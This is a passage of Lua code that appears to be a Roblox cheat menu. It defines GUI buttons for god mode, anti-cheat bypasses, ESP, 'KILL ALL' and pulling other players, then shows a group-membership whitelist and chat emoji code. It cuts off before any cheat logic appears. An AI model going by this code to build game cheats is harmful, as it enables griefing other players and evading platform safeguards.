UIGradient_9.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(102, 255, 0)), ColorSequenceKeypoint.new(0.57, Color3.fromRGB(235, 229, 55)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(42, 220, 255))}
UIGradient_9.Parent = RUSSO_FE

REJOIN.Name = "REJOIN"
REJOIN.Parent = Scroll
REJOIN.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
REJOIN.BackgroundTransparency = 1.000
REJOIN.Position = UDim2.new(0.0126126129, 0, 0.0618279576, 0)
REJOIN.Size = UDim2.new(1, 0, 1, 0)
REJOIN.Font = Enum.Font.LuckiestGuy
REJOIN.Text = "REJOIN GAME"
REJOIN.TextColor3 = Color3.fromRGB(255, 255, 255)
REJOIN.TextScaled = true
REJOIN.TextSize = 14.000
REJOIN.TextStrokeTransparency = 0.500
REJOIN.TextWrapped = true

UIGradient_10.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(102, 255, 0)), ColorSequenceKeypoint.new(0.57, Color3.fromRGB(235, 229, 55)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(42, 220, 255))}
UIGradient_10.Parent = REJOIN

GIVETOOLS.Name = "GIVETOOLS"
GIVETOOLS.Parent = Scroll
GIVETOOLS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GIVETOOLS.BackgroundTransparency = 1.000
GIVETOOLS.Position = UDim2.new(0.0126126129, 0, 0.0618279576, 0)
GIVETOOLS.Size = UDim2.new(1, 0, 1, 0)
GIVETOOLS.Font = Enum.Font.LuckiestGuy
GIVETOOLS.Text = "GIVE TOOLS"
GIVETOOLS.TextColor3 = Color3.fromRGB(255, 255, 255)
GIVETOOLS.TextScaled = true
GIVETOOLS.TextSize = 14.000
GIVETOOLS.TextStrokeTransparency = 0.500
GIVETOOLS.TextWrapped = true

UIGradient_11.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(102, 255, 0)), ColorSequenceKeypoint.new(0.57, Color3.fromRGB(235, 229, 55)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(42, 220, 255))}
UIGradient_11.Parent = GIVETOOLS

GODMODE.Name = "GODMODE"
GODMODE.Parent = Scroll
GODMODE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GODMODE.BackgroundTransparency = 1.000
GODMODE.Position = UDim2.new(0.0126126129, 0, 0.0618279576, 0)
GODMODE.Size = UDim2.new(1, 0, 1, 0)
GODMODE.Font = Enum.Font.LuckiestGuy
GODMODE.Text = "GOD MODE"
GODMODE.TextColor3 = Color3.fromRGB(255, 255, 255)
GODMODE.TextScaled = true
GODMODE.TextSize = 14.000
GODMODE.TextStrokeTransparency = 0.500
GODMODE.TextWrapped = true

UIGradient_12.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(102, 255, 0)), ColorSequenceKeypoint.new(0.57, Color3.fromRGB(235, 229, 55)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(42, 220, 255))}
UIGradient_12.Parent = GODMODE

INVISIBLE.Name = "INVISIBLE"
INVISIBLE.Parent = Scroll
INVISIBLE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
INVISIBLE.BackgroundTransparency = 1.000
INVISIBLE.Position = UDim2.new(0.0126126129, 0, 0.0618279576, 0)
INVISIBLE.Size = UDim2.new(1, 0, 1, 0)
INVISIBLE.Font = Enum.Font.LuckiestGuy
INVISIBLE.Text = "INVISIBLE"
INVISIBLE.TextColor3 = Color3.fromRGB(255, 255, 255)
INVISIBLE.TextScaled = true
INVISIBLE.TextSize = 14.000
INVISIBLE.TextStrokeTransparency = 0.500
INVISIBLE.TextWrapped = true

UIGradient_13.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(102, 255, 0)), ColorSequenceKeypoint.new(0.57, Color3.fromRGB(235, 229, 55)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(42, 220, 255))}
UIGradient_13.Parent = INVISIBLE

avatar.Name = "avatar"
avatar.Parent = Scroll
avatar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
avatar.BackgroundTransparency = 1.000
avatar.Position = UDim2.new(0.0126126129, 0, 0.0618279576, 0)
avatar.Size = UDim2.new(1, 0, 1, 0)
avatar.Font = Enum.Font.LuckiestGuy
avatar.Text = "LOOK AT YOUR FRIENDS 'SUITS"
avatar.TextColor3 = Color3.fromRGB(255, 255, 255)
avatar.TextScaled = true
avatar.TextSize = 14.000
avatar.TextStrokeTransparency = 0.500
avatar.TextWrapped = true

UIGradient_14.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(102, 255, 0)), ColorSequenceKeypoint.new(0.57, Color3.fromRGB(235, 229, 55)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(42, 220, 255))}
UIGradient_14.Parent = avatar

soonmore.Name = "soon more"
soonmore.Parent = Scroll
soonmore.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
soonmore.BackgroundTransparency = 1.000
soonmore.Position = UDim2.new(0.0126126129, 0, 0.0618279576, 0)
soonmore.Size = UDim2.new(1, 0, 1, 0)
soonmore.Font = Enum.Font.LuckiestGuy
soonmore.Text = "[SOON MORE]"
soonmore.TextColor3 = Color3.fromRGB(255, 255, 255)
soonmore.TextScaled = true
soonmore.TextSize = 14.000
soonmore.TextStrokeTransparency = 0.500
soonmore.TextWrapped = true

Main_2.Name = "Main"
Main_2.Parent = Main
Main_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main_2.BackgroundTransparency = 1.000
Main_2.Position = UDim2.new(0.206008583, 0, 0.0992736071, 0)
Main_2.Size = UDim2.new(0, 555, 0, 372)
Main_2.Visible = false

ScrollingFrame.Parent = Main_2
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0, 0, 0.0239695683, 0)
ScrollingFrame.Size = UDim2.new(0, 555, 0, 363)
ScrollingFrame.ScrollBarThickness = 5

WEAPONS.Name = "WEAPONS"
WEAPONS.Parent = ScrollingFrame
WEAPONS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WEAPONS.BackgroundTransparency = 1.000
WEAPONS.Position = UDim2.new(0.0126126129, 0, 0.0295698922, 0)
WEAPONS.Size = UDim2.new(1, 0, 1, 0)
WEAPONS.Font = Enum.Font.LuckiestGuy
WEAPONS.Text = "WEAPONS"
WEAPONS.TextColor3 = Color3.fromRGB(255, 255, 255)
WEAPONS.TextScaled = true
WEAPONS.TextSize = 14.000
WEAPONS.TextStrokeTransparency = 0.500
WEAPONS.TextWrapped = true

UIGradient_15.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(127, 255, 80)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(88, 255, 236))}
UIGradient_15.Parent = WEAPONS

UIGridLayout_2.Parent = ScrollingFrame
UIGridLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIGridLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout_2.CellPadding = UDim2.new(0, 5, 0.0120000001, 0)
UIGridLayout_2.CellSize = UDim2.new(1, 0, 0.0289999992, 0)
UIGridLayout_2.FillDirectionMaxCells = 11

NOCLIP.Name = "NOCLIP"
NOCLIP.Parent = ScrollingFrame
NOCLIP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
NOCLIP.BackgroundTransparency = 1.000
NOCLIP.Position = UDim2.new(0.0126126129, 0, 0.0295698922, 0)
NOCLIP.Size = UDim2.new(1, 0, 1, 0)
NOCLIP.Font = Enum.Font.LuckiestGuy
NOCLIP.Text = "ANTINOCLIP-BYPASS"
NOCLIP.TextColor3 = Color3.fromRGB(255, 255, 255)
NOCLIP.TextScaled = true
NOCLIP.TextSize = 14.000
NOCLIP.TextStrokeTransparency = 0.500
NOCLIP.TextWrapped = true

UIGradient_16.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(127, 255, 80)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(88, 255, 236))}
UIGradient_16.Parent = NOCLIP

JUMPCOOLDOWN.Name = "JUMPCOOLDOWN"
JUMPCOOLDOWN.Parent = ScrollingFrame
JUMPCOOLDOWN.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
JUMPCOOLDOWN.BackgroundTransparency = 1.000
JUMPCOOLDOWN.Position = UDim2.new(0.0126126129, 0, 0.0295698922, 0)
JUMPCOOLDOWN.Size = UDim2.new(1, 0, 1, 0)
JUMPCOOLDOWN.Font = Enum.Font.LuckiestGuy
JUMPCOOLDOWN.Text = "ANTIJUMPCOOLDOWN-BYPASS"
JUMPCOOLDOWN.TextColor3 = Color3.fromRGB(255, 255, 255)
JUMPCOOLDOWN.TextScaled = true
JUMPCOOLDOWN.TextSize = 14.000
JUMPCOOLDOWN.TextStrokeTransparency = 0.500
JUMPCOOLDOWN.TextWrapped = true

UIGradient_17.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(127, 255, 80)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(88, 255, 236))}
UIGradient_17.Parent = JUMPCOOLDOWN

ESPALL.Name = "ESPALL"
ESPALL.Parent = ScrollingFrame
ESPALL.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ESPALL.BackgroundTransparency = 1.000
ESPALL.Position = UDim2.new(0.0126126129, 0, 0.0295698922, 0)
ESPALL.Size = UDim2.new(1, 0, 1, 0)
ESPALL.Font = Enum.Font.LuckiestGuy
ESPALL.Text = "ESP ALL"
ESPALL.TextColor3 = Color3.fromRGB(255, 255, 255)
ESPALL.TextScaled = true
ESPALL.TextSize = 14.000
ESPALL.TextStrokeTransparency = 0.500
ESPALL.TextWrapped = true

UIGradient_18.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(127, 255, 80)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(88, 255, 236))}
UIGradient_18.Parent = ESPALL

FULLBRIGHT.Name = "FULLBRIGHT"
FULLBRIGHT.Parent = ScrollingFrame
FULLBRIGHT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FULLBRIGHT.BackgroundTransparency = 1.000
FULLBRIGHT.Position = UDim2.new(0.0126126129, 0, 0.0295698922, 0)
FULLBRIGHT.Size = UDim2.new(1, 0, 1, 0)
FULLBRIGHT.Font = Enum.Font.LuckiestGuy
FULLBRIGHT.Text = "FULL BRIGH"
FULLBRIGHT.TextColor3 = Color3.fromRGB(255, 255, 255)
FULLBRIGHT.TextScaled = true
FULLBRIGHT.TextSize = 14.000
FULLBRIGHT.TextStrokeTransparency = 0.500
FULLBRIGHT.TextWrapped = true

UIGradient_19.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(127, 255, 80)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(88, 255, 236))}
UIGradient_19.Parent = FULLBRIGHT

FREENIGHT.Name = "FREENIGHT"
FREENIGHT.Parent = ScrollingFrame
FREENIGHT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FREENIGHT.BackgroundTransparency = 1.000
FREENIGHT.Position = UDim2.new(0.0126126129, 0, 0.0295698922, 0)
FREENIGHT.Size = UDim2.new(1, 0, 1, 0)
FREENIGHT.Font = Enum.Font.LuckiestGuy
FREENIGHT.Text = "FREE NIGHT VISION"
FREENIGHT.TextColor3 = Color3.fromRGB(255, 255, 255)
FREENIGHT.TextScaled = true
FREENIGHT.TextSize = 14.000
FREENIGHT.TextStrokeTransparency = 0.500
FREENIGHT.TextWrapped = true

UIGradient_20.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(127, 255, 80)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(88, 255, 236))}
UIGradient_20.Parent = FREENIGHT

FREETHERMAL.Name = "FREETHERMAL"
FREETHERMAL.Parent = ScrollingFrame
FREETHERMAL.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FREETHERMAL.BackgroundTransparency = 1.000
FREETHERMAL.Position = UDim2.new(0.0126126129, 0, 0.0295698922, 0)
FREETHERMAL.Size = UDim2.new(1, 0, 1, 0)
FREETHERMAL.Font = Enum.Font.LuckiestGuy
FREETHERMAL.Text = "FREE THERMAL VISION"
FREETHERMAL.TextColor3 = Color3.fromRGB(255, 255, 255)
FREETHERMAL.TextScaled = true
FREETHERMAL.TextSize = 14.000
FREETHERMAL.TextStrokeTransparency = 0.500
FREETHERMAL.TextWrapped = true

UIGradient_21.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(127, 255, 80)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(88, 255, 236))}
UIGradient_21.Parent = FREETHERMAL

GODFIRE.Name = "GODFIRE"
GODFIRE.Parent = ScrollingFrame
GODFIRE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GODFIRE.BackgroundTransparency = 1.000
GODFIRE.Position = UDim2.new(0.0126126129, 0, 0.0295698922, 0)
GODFIRE.Size = UDim2.new(1, 0, 1, 0)
GODFIRE.Font = Enum.Font.LuckiestGuy
GODFIRE.Text = "GOD FIRE"
GODFIRE.TextColor3 = Color3.fromRGB(255, 255, 255)
GODFIRE.TextScaled = true
GODFIRE.TextSize = 14.000
GODFIRE.TextStrokeTransparency = 0.500
GODFIRE.TextWrapped = true

UIGradient_22.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(127, 255, 80)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(88, 255, 236))}
UIGradient_22.Parent = GODFIRE

AIR.Name = "AIR"
AIR.Parent = ScrollingFrame
AIR.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AIR.BackgroundTransparency = 1.000
AIR.Position = UDim2.new(0.0126126129, 0, 0.0295698922, 0)
AIR.Size = UDim2.new(1, 0, 1, 0)
AIR.Font = Enum.Font.LuckiestGuy
AIR.Text = "BUY AIR STRIKE"
AIR.TextColor3 = Color3.fromRGB(255, 255, 255)
AIR.TextScaled = true
AIR.TextSize = 14.000
AIR.TextStrokeTransparency = 0.500
AIR.TextWrapped = true

UIGradient_23.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(127, 255, 80)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(88, 255, 236))}
UIGradient_23.Parent = AIR

ARMOR.Name = "ARMOR"
ARMOR.Parent = ScrollingFrame
ARMOR.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ARMOR.BackgroundTransparency = 1.000
ARMOR.Position = UDim2.new(0.0126126129, 0, 0.0295698922, 0)
ARMOR.Size = UDim2.new(1, 0, 1, 0)
ARMOR.Font = Enum.Font.LuckiestGuy
ARMOR.Text = "BUY ARMOR"
ARMOR.TextColor3 = Color3.fromRGB(255, 255, 255)
ARMOR.TextScaled = true
ARMOR.TextSize = 14.000
ARMOR.TextStrokeTransparency = 0.500
ARMOR.TextWrapped = true

UIGradient_24.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(127, 255, 80)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(88, 255, 236))}
UIGradient_24.Parent = ARMOR

YTCHANNEL.Name = "YTCHANNEL"
YTCHANNEL.Parent = ScrollingFrame
YTCHANNEL.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
YTCHANNEL.BackgroundTransparency = 1.000
YTCHANNEL.Position = UDim2.new(0.0126126129, 0, 0.0295698922, 0)
YTCHANNEL.Size = UDim2.new(1, 0, 1, 0)
YTCHANNEL.Font = Enum.Font.LuckiestGuy
YTCHANNEL.Text = "VIEW YT CHANNEL"
YTCHANNEL.TextColor3 = Color3.fromRGB(255, 255, 255)
YTCHANNEL.TextScaled = true
YTCHANNEL.TextSize = 14.000
YTCHANNEL.TextStrokeTransparency = 0.500
YTCHANNEL.TextWrapped = true

UIGradient_25.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(127, 255, 80)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(88, 255, 236))}
UIGradient_25.Parent = YTCHANNEL

OPENDISCORD.Name = "OPENDISCORD"
OPENDISCORD.Parent = ScrollingFrame
OPENDISCORD.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OPENDISCORD.BackgroundTransparency = 1.000
OPENDISCORD.Position = UDim2.new(0.0126126129, 0, 0.0295698922, 0)
OPENDISCORD.Size = UDim2.new(1, 0, 1, 0)
OPENDISCORD.Font = Enum.Font.LuckiestGuy
OPENDISCORD.Text = "INVITE DISCORD LINK"
OPENDISCORD.TextColor3 = Color3.fromRGB(255, 255, 255)
OPENDISCORD.TextScaled = true
OPENDISCORD.TextSize = 14.000
OPENDISCORD.TextStrokeTransparency = 0.500
OPENDISCORD.TextWrapped = true

UIGradient_26.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(127, 255, 80)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(88, 255, 236))}
UIGradient_26.Parent = OPENDISCORD

VIP.Name = "VIP"
VIP.Parent = Main
VIP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
VIP.BackgroundTransparency = 1.000
VIP.Position = UDim2.new(0.206008583, 0, 0.0992736071, 0)
VIP.Size = UDim2.new(0, 555, 0, 372)
VIP.Visible = false

Bring_BTN.Name = "Bring_BTN"
Bring_BTN.Parent = VIP
Bring_BTN.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Bring_BTN.BorderSizePixel = 0
Bring_BTN.Position = UDim2.new(0.293643266, 0, 0.552209914, 0)
Bring_BTN.Size = UDim2.new(0, 219, 0, 33)
Bring_BTN.ZIndex = 5
Bring_BTN.Font = Enum.Font.PermanentMarker
Bring_BTN.Text = "cbring"
Bring_BTN.TextColor3 = Color3.fromRGB(255, 255, 255)
Bring_BTN.TextScaled = true
Bring_BTN.TextSize = 14.000
Bring_BTN.TextWrapped = true

UICorner_2.Parent = Bring_BTN

Unbring_BTN.Name = "Unbring_BTN"
Unbring_BTN.Parent = VIP
Unbring_BTN.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Unbring_BTN.BorderSizePixel = 0
Unbring_BTN.Position = UDim2.new(0.329090983, 0, 0.703267395, 0)
Unbring_BTN.Size = UDim2.new(0, 183, 0, 33)
Unbring_BTN.ZIndex = 2
Unbring_BTN.Font = Enum.Font.PermanentMarker
Unbring_BTN.Text = "uncbring"
Unbring_BTN.TextColor3 = Color3.fromRGB(255, 255, 255)
Unbring_BTN.TextScaled = true
Unbring_BTN.TextSize = 14.000
Unbring_BTN.TextWrapped = true

UICorner_3.Parent = Unbring_BTN

targets_box.Name = "targets_box"
targets_box.Parent = VIP
targets_box.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
targets_box.BackgroundTransparency = 0.500
targets_box.BorderSizePixel = 0
targets_box.Position = UDim2.new(0.0633858368, 0, 0.37907812, 0)
targets_box.Size = UDim2.new(0, 476, 0, 38)
targets_box.Font = Enum.Font.GothamBold
targets_box.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
targets_box.PlaceholderText = "Player1,Player2 or All"
targets_box.Text = ""
targets_box.TextColor3 = Color3.fromRGB(0, 0, 0)
targets_box.TextScaled = true
targets_box.TextSize = 14.000
targets_box.TextWrapped = true
targets_box.TextXAlignment = Enum.TextXAlignment.Left

UICorner_4.Parent = targets_box

ImageLabel.Parent = VIP
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 11.000
ImageLabel.Position = UDim2.new(0.82610929, 0, 0.0913978517, 0)
ImageLabel.Size = UDim2.new(0, 52, 0, 48)
ImageLabel.Image = "rbxassetid://7331271763"

Warn_2.Name = "Warn"
Warn_2.Parent = VIP
Warn_2.BackgroundTransparency = 1.000
Warn_2.Position = UDim2.new(0.0180180203, 0, 0.880376339, 0)
Warn_2.Size = UDim2.new(0, 25, 0, 25)
Warn_2.Image = "rbxassetid://7072980286"

UIAspectRatioConstraint.Parent = Warn_2

Text.Name = "Text"
Text.Parent = Warn_2
Text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Text.BackgroundTransparency = 1.000
Text.Position = UDim2.new(1.30007815, 0, 0.063948974, 0)
Text.Size = UDim2.new(0, 252, 0, 23)
Text.Font = Enum.Font.GothamBlack
Text.Text = "To use this you need to have at least 1 weapon"
Text.TextColor3 = Color3.fromRGB(255, 255, 255)
Text.TextScaled = true
Text.TextSize = 14.000
Text.TextWrapped = true

TextLabel_13.Parent = Warn_2
TextLabel_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_13.BackgroundTransparency = 1.000
TextLabel_13.Position = UDim2.new(1.268628, 0, -11.1275005, 0)
TextLabel_13.Size = UDim2.new(0, 370, 0, 16)
TextLabel_13.Font = Enum.Font.GothamBlack
TextLabel_13.Text = "Any error or bug you can report it on our discord server."
TextLabel_13.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_13.TextScaled = true
TextLabel_13.TextSize = 14.000
TextLabel_13.TextWrapped = true

Frame.Parent = VIP
Frame.BackgroundColor3 = Color3.fromRGB(60, 255, 30)
Frame.Position = UDim2.new(0.290434003, 0, 0.549609005, 0)
Frame.Size = UDim2.new(0, 223, 0, 36)

UICorner_5.Parent = Frame

Frame_2.Parent = VIP
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
Frame_2.Position = UDim2.new(0.324206173, 0, 0.697458446, 0)
Frame_2.Size = UDim2.new(0, 187, 0, 36)

UICorner_6.Parent = Frame_2

Frame_3.Parent = VIP
Frame_3.BackgroundColor3 = Color3.fromRGB(199, 69, 255)
Frame_3.Position = UDim2.new(0.688237906, 0, 0.866813302, 0)
Frame_3.Size = UDim2.new(0, 160, 0, 36)

UICorner_7.Parent = Frame_3

KILL_BTN.Name = "KILL_BTN"
KILL_BTN.Parent = VIP
KILL_BTN.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
KILL_BTN.BorderSizePixel = 0
KILL_BTN.Position = UDim2.new(0.690543711, 0, 0.86941421, 0)
KILL_BTN.Size = UDim2.new(0, 157, 0, 33)
KILL_BTN.ZIndex = 5
KILL_BTN.Font = Enum.Font.PermanentMarker
KILL_BTN.Text = "KILL ALL"
KILL_BTN.TextColor3 = Color3.fromRGB(255, 255, 255)
KILL_BTN.TextScaled = true
KILL_BTN.TextSize = 14.000
KILL_BTN.TextWrapped = true

UICorner_8.Parent = KILL_BTN

line_3.Name = "line"
line_3.Parent = VIP
line_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
line_3.BorderColor3 = Color3.fromRGB(255, 255, 255)
line_3.Position = UDim2.new(-0.0011986196, 0, 0.850946486, 0)
line_3.Size = UDim2.new(0, 555, 0, 0)

Bye.Name = "Bye"
Bye.Parent = Main
Bye.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Bye.BackgroundTransparency = 1.000
Bye.Position = UDim2.new(0.935622334, 0, 0, 0)
Bye.Size = UDim2.new(0, 45, 0, 36)
Bye.Font = Enum.Font.SourceSans
Bye.TextColor3 = Color3.fromRGB(0, 0, 0)
Bye.TextSize = 14.000
Bye.TextTransparency = 1.000

Icon_2.Name = "Icon"
Icon_2.Parent = Bye
Icon_2.BackgroundTransparency = 1.000
Icon_2.Position = UDim2.new(0.244444445, 0, 0.25, 0)
Icon_2.Size = UDim2.new(0, 25, 0, 25)
Icon_2.Image = "rbxassetid://7072723727"

Open.Name = "Open"
Open.Parent = PsychoGuiv3
Open.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Open.BackgroundTransparency = 1.000
Open.Position = UDim2.new(0.00547445286, 0, 0.908548713, 0)
Open.Size = UDim2.new(0, 61, 0, 37)
Open.Font = Enum.Font.SourceSans
Open.Text = ""
Open.TextColor3 = Color3.fromRGB(0, 0, 0)
Open.TextSize = 14.000

Icon_3.Name = "Icon"
Icon_3.Parent = Open
Icon_3.BackgroundTransparency = 1.000
Icon_3.Position = UDim2.new(0.147540987, 0, -1.1920929e-07, 0)
Icon_3.Size = UDim2.new(0, 35, 0, 35)
Icon_3.Image = "rbxassetid://7072723598"

-- Scripts:

local function LEWCQ_fake_script() -- PsychoGuiv3.SGAMESC_CLIENT 
	local script = Instance.new('LocalScript', PsychoGuiv3)

	--[[
	
	  ___          ___                       ___                    
	 | _ )  _  _  | _ )  _ _   __ _   _ _   | _ )  ___  __ __  _  _ 
	 | _ \ | || | | _ \ | '_| / _` | | ' \  | _ \ / _ \ \ \ / | || |
	 |___/  \_, | |___/ |_|   \__,_| |_||_| |___/ \___/ /_\_\  \_, |
	        |__/                                               |__/ 
	
	
	PUTO EL QUE LO LEA XD
	
	
	--]]
	
	
	
	-----------------------------------|
	-- [[ WHITELISTED ]]
	
	
	local isKick = false
	local isBan = false
	local Checker = game.Players.LocalPlayer
	local Grupo = 12416999
	
	
	function whitelist()
		local player = game.Players.LocalPlayer
		if player:IsInGroup(Grupo) then
			if player:GetRankInGroup(Grupo) >=1 then
				return true
			end
		end
		return false
	end
	
	
	if not whitelist() then 
		local Grupos = "https://www.roblox.com/groups/12416999/SGAMESC#!/about"
		site = string.gsub(string.gsub(Grupos,"/","\\"),":\\\\","://").."?www.roblox.com"
		local gui = game.GuiService:OpenBrowserWindow(site)
		return 
	end
	
	
	if whitelist() then
	-----------------------------------|
	-- EMOJIS
	
	
	coroutine.wrap(function()
		while wait(.5) do
			for _, player in pairs(game.Players:GetPlayers()) do
				if player.Character then
					if player.Character:FindFirstChild("Head") then
						if not player.Character.Head:FindFirstChild("BG") then
							local BG = Instance.new("BillboardGui")
							local ImageLabel = Instance.new("ImageLabel")
							local UICorner = Instance.new("UICorner")
							local UIScale = Instance.new("UIScale")
							local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
							BG.Name = "BG"
							BG.Parent = player.Character.Head
							BG.Enabled = false
							BG.Active = true
							BG.AlwaysOnTop = true
							BG.Size = UDim2.new(1, 0, 1, 0)
							BG.StudsOffset = Vector3.new(0, 2.0999999046326, 0)
							ImageLabel.Parent = BG
							ImageLabel.Active = true
							ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
							ImageLabel.BackgroundTransparency = 1.000
							ImageLabel.ClipsDescendants = true
							ImageLabel.Size = UDim2.new(1, 0, 1, 0)
							ImageLabel.Image = "rbxassetid://7331149924"
							UICorner.Parent = ImageLabel
							UIScale.Parent = ImageLabel
							UIAspectRatioConstraint.Parent = ImageLabel						
							player.Chatted:Connect(function(message)
								if message == ':XD:' or message == ':perroxd:' and player.Character and player.Character:FindFirstChild("Head") and player.Character:FindFirstChild("Head"):WaitForChild("BG") then
									player.Character.Head.BG.Enabled = true
									player.Character.Head.BG.ImageLabel.Image = "rbxassetid://7331149924"
									wait(5)
									player.Character.Head.BG.Enabled = false --7331205491
								else
									if message == ':ah:' or message == ':AH:' or message == ':Ah:' and player.Character and player.Character:FindFirstChild("Head") and player.Character:FindFirstChild("Head"):WaitForChild("BG") then
										player.Character.Head.BG.Enabled = true
										player.Character.Head.BG.ImageLabel.Image = "rbxassetid://7331205491"--7331348935
										wait(5)
										player.Character.Head.BG.Enabled = false --7331205491
									elseif message == ':ugu:' or message == ':uwu:' or message == ':sonrojado:' and player.Character and player.Character:FindFirstChild("Head") and player.Character:FindFirstChild("Head"):WaitForChild("BG") then
										player.Character.Head.BG.Enabled = true
										player.Character.Head.BG.ImageLabel.Image = "rbxassetid://7331271763"
										wait(5)
										player.Character.Head.BG.Enabled = false 
									elseif message == ':tristi:' and player.Character and player.Character:FindFirstChild("Head") and player.Character:FindFirstChild("Head"):WaitForChild("BG") then
										player.Character.Head.BG.Enabled = true
										player.Character.Head.BG.ImageLabel.Image = "rbxassetid://7331278322"
										wait(5)
										player.Character.Head.BG.Enabled = false --7843646227 
									elseif message == ':qe:' and player.Character and player.Character:FindFirstChild("Head") and player.Character:FindFirstChild("Head"):WaitForChild("BG") then
										player.Character.Head.BG.Enabled = true
										player.Character.Head.BG.ImageLabel.Image = "rbxassetid://7843646227"
										wait(5)
										player.Character.Head.BG.Enabled = false -- 
									elseif message == ':SC:' and player.Character and player.Character:FindFirstChild("Head") and player.Character:FindFirstChild("Head"):WaitForChild("BG") then
										player.Character.Head.BG.Enabled = true
										player.Character.Head.BG.ImageLabel.Image = "rbxassetid://7830295518"
										wait(5)
										player.Character.Head.BG.Enabled = false -- 
									end
								end
							end)
						end
					end
				end
			end
		end
	end)()
	
	
	
	-----------------------------------|
	-- [[ BOTONES ]]
	
	
	local Main_Frame = script.Parent.Main
	local User_txt = Main_Frame.User.TextLabel
	local Discord = 'https://discord.com/invite/nsQBzuyxTX'
	
	-----------------------------------|
	-- [[ FRAMES ]]
	
	local Whitelist = false
	local isOwner = false
	local GetRank = false
	local Espera = false
	local Scripts = Main_Frame.Main
	local Credits_Frame = Main_Frame
	local VIP_Frame = Main_Frame.VIP
	local Extra_Frame = Main_Frame.Extras
	
	
	
	local Hitbox = Extra_Frame.Scroll.HITBOX
	local INFINITE_YIELD = Extra_Frame.Scroll.INFINITE_YIELD
	local ESP_PLAYER = Extra_Frame.Scroll.ESP_PLAYERS
	local ALLANIMATION = Extra_Frame.Scroll.ALL_ANIMATIONSYEMOTES
	local CUSTOM_ANIMATIONS = Extra_Frame.Scroll.CUSTOM_ANIMATIONS
	local ENANO_SCRIPTS = Extra_Frame.Scroll.ENANO_SCRIPTS
	local GIANT_SCRIPT = Extra_Frame.Scroll.GIANT_SCRIPT
